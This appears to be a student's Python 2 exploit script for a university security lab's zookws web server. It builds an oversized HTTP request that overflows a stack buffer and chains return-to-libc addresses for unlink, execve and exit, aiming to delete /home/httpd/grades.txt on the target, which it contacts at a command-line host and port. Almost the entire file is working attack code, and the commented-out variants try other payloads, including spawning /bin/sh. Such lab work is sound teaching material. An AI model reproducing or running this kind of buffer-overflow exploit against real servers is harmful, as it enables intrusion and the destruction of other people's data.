#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct
#import pdb
####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0x34567890
stack_saved_ebp = 0x12345678
stack_retaddr = stack_saved_ebp + 4
noop = '\x90'
unlinkaddr =  struct.pack("<I", 0x4010c530)
#OK well that sucks unlink's addr has a \n in it :(
#I'll be sneaky and us execve("unlink $filepath") muhahahaha
execveaddr = struct.pack("<I", 0x400e42e0)
exitaddr = struct.pack("<I", 0x4005efb0)
filepath = '/home/httpd/grades.txt\x000'
shellpath = '/bin/sh\x000'
reqpathaddr = struct.pack("<I", 0xbfffee08)
argaddr = struct.pack("<I", 0xbfffde28)
request_headers_bufferaddr=struct.pack("<I", 0x401d2ef8)
valaddr = struct.pack("<I", 0xbfffde58+63) #this is incredibly arbitrary
# (struct.pack("<I", 0xbfffee08))*1000



## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
    #path = "/" + '\x90'*3 + (struct.pack("<I", 0xbfffee08))*1000
    #path = "/" + 'A'*(2044+20) + unlinkaddr + exitaddr + filepath
    #path = "/" + filepath + 'A'*(2048+19-len(filepath)) + unlinkaddr + exitaddr + reqpathaddr
    path = '/' + 'A'*(1022-14) + unlinkaddr + 'DDDDDDDDDDDD' + exitaddr + valaddr
    #val = 'A'*(520+12) + execveaddr + exitaddr + argaddr + shellpath
    #val = 'A'*(520+16) + unlinkaddr + exitaddr + argaddr + filepath
    val = 'U'*64 + filepath
    method = val
    req =   "GET " + path + " " + method + "\n" + \
            "header: " + val + '\n'+ \
            "\r\n"
    print req
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
#    pdb.set_trace()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

